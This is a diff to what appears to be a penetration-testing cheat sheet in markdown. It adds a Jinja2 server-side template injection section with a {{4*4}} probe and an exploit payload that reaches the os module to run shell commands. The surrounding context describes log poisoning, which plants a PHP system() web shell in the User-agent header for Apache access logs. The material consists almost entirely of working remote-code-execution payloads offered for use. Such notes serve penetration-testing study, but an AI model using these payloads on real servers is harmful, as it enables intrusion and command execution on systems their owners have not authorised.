@@ -454,6 +454,16 @@ Virutal Hosts file : `/etc/apache2/sites-available/000-default.conf`<br/>
 
 If we can read log files,we can poison them to get RCE<br />
 
+### SSTI (Server Side Template Injection)
+
+#### Jinja2
+
+Check for `{{4*4}}` on the url `http://IP/{{4*4}}` if it returns "16" as a result it is vulnerable to SSTI <br/>
+
+
+**Exploit**
+`{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}`
+
 #### For Apache2
 
 For apache `/var/log/apache2/access.log` try to access the log and if we can then add `<?php system($_GET['c']); ?>`in User-agent<br/>
